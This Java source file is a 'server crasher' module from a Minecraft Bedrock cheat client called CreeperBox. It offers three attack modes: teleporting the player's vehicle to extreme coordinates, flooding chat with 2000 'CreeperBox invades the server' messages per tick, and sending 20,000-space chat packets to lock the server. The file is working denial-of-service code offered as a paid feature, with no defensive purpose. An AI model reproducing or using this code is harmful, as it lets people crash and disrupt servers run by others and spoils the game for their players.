package helper.creeperbox.feature.module.modules.survival;

import static helper.creeperbox.feature.module.modules.survival.HorseSpawn.hexToByteArray;

import org.cloudburstmc.protocol.bedrock.packet.ModalFormRequestPacket;
import org.cloudburstmc.protocol.bedrock.packet.TextPacket;
import org.cloudburstmc.protocol.bedrock.packet.UnknownPacket;

import java.util.Arrays;

import helper.creeperbox.clients.CreeperBox;
import helper.creeperbox.feature.component.GameDataComponent;
import helper.creeperbox.feature.event.SubscribeEvent;
import helper.creeperbox.feature.event.events.TickEvent;
import helper.creeperbox.feature.module.Category;
import helper.creeperbox.feature.module.Module;
import helper.creeperbox.feature.module.ModuleInfo;
import helper.creeperbox.feature.settings.ListValue;
import helper.creeperbox.sdk.entity.type.EntityActor;
import helper.creeperbox.sdk.entity.type.EntityLocalPlayer;
import helper.creeperbox.sdk.math.Vec3f;
import helper.creeperbox.sdk.network.packet.modify.NeteaseTextPacket;
import io.netty.buffer.Unpooled;

@ModuleInfo(name = "一键崩服", category = Category.Survival)
public class ServerCrasher extends Module {

    private final ListValue mode = new ListValue("模式",this,"载具")
            .addSubList("载具")
            .addSubList("刷屏")
            .addSubList("锁服");

    public long ONE_HOUR = 60 * 60 * 1000;
    public long ONE_DAY = 24 * ONE_HOUR;
    public long ONE_YEAR = 365 * ONE_DAY;

    private boolean success = false;
    private boolean first = false;
    private String crasherText;
    public ServerCrasher(){
        byte[] spaces = new byte[20000];
        Arrays.fill(spaces, (byte) ' ');
        crasherText = new String(spaces);
    }


    @Override
    public void onEnable() {
        if(!mode.getCurrentValue().equals("锁服")) return;
        first = true;
        // -1 表示永久用户，应该允许使用
        if(CreeperBox.y() != -1 && CreeperBox.y() <= ONE_YEAR){
            EntityLocalPlayer player = CreeperBox.INSTANCE.getLocalPlayer();
            if(player!=null){
                ModalFormRequestPacket packet = new ModalFormRequestPacket();
                packet.setFormData("{\"type\":\"form\",\"title\":\"崩服开启失败\",\"content\":\"§c此功能仅为永久用户使用\",\"buttons\":[{\"type\":\"button\",\"text\":\"确认\"}]}");
                packet.setFormId(0);
                player.receivePacket(packet);
            }
            success = false;
        } else {
            success = true;
        }
    }

    @SubscribeEvent
    public void onTick(TickEvent event) {
        if(mode.getCurrentValue().equals("载具")){
            EntityActor vehicle = event.getPlayer().getVehicle();
            if(vehicle != null) {
                vehicle.setPos(new Vec3f(300000000,300000000,300000000));
            }
        }else if(mode.getCurrentValue().equals("刷屏")){
            NeteaseTextPacket packet = new NeteaseTextPacket();
            packet.setHasExtra(true);
            packet.setType(TextPacket.Type.CHAT);
            packet.setXuid("");
            packet.setAuthor("");
            packet.setPlatformChatId("");
            packet.setSourceName(event.getPlayer().getNameTag());
            for(int i = 0; i < 2000;i++){
                packet.setMessage("苦力怕盒子入侵服务器");
                event.getPlayer().sendPacket(packet);
            }
        }else{
            if(first){
                event.getPlayer().displayClientMessage("§c服务器已锁定！");
                first = false;
            }
            if(!CreeperBox.INSTANCE.getRoomSid().contains("NetworkGame") && success){
                NeteaseTextPacket packet = new NeteaseTextPacket();
                packet.setHasExtra(true);
                packet.setType(TextPacket.Type.CHAT);
                packet.setXuid("");
                packet.setAuthor("");
                packet.setPlatformChatId("");
                packet.setSourceName(event.getPlayer().getNameTag());
                packet.setMessage(crasherText);
                event.getPlayer().sendPacketNoEvent(packet);
            }
        }
    }



    @Override
    public String getTag() {
        return mode.getCurrentValue().equals("载具")?"Vehicle":mode.getCurrentValue().equals("刷屏")?"Spammer":"Lock";
    }
}
